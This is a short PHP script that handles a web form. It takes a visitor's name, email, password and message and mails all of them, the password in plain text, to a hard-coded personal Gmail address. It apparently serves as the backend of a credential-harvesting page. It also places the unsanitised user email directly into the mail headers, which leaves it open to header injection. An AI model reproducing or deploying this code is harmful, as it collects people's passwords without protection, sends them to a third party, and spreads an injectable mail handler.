<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect input data from the form
    $name = $_POST["name"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    $message = $_POST["message"];

    // Build the email message
    $to = "pratyakshsinghal635@gmail.com";
    $subject = "New form submission from " . $name;
    $body = "Name: " . $name . "\n\n" .
            "Email: " . $email . "\n\n" .
            "Password: " . $password . "\n\n" .
            "Message:\n" . $message;
    $headers = "From: " . $email . "\r\n" .
               "Reply-To: " . $email . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Send the email
    if (mail($to, $subject, $body, $headers)) {
        echo "Thank you for your message!";
    } else {
        echo "Sorry, there was a problem sending your message. Please try again later.";
    }
}
